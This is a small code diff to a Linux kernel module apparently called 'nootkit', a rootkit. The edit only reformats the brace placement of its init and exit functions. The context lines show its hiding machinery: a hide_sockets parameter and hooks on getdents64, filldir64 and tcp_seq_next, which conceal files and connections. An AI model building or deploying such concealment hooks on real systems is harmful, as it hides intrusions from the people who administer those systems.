@@ -27,7 +27,8 @@ char *hide_sockets_strs[MAX_HIDE_ENTITIES];
 int hide_sockets_count;
 module_param_array_named(hide_sockets, hide_sockets_strs, charp, &hide_sockets_count, 0);
 
-int nootkit_init(void) {
+int nootkit_init(void)
+{
     printk(KERN_INFO "Initializing nootkit!\n");
 
     if (config_parse_globals()) {
@@ -52,7 +53,8 @@ int nootkit_init(void) {
     return 0;
 }
 
-void nootkit_exit(void) {
+void nootkit_exit(void)
+{
     hide_hook_unset_filldir64();
     hide_hook_unset_tcp_seq_next();
     hide_hook_unset_getdents64();
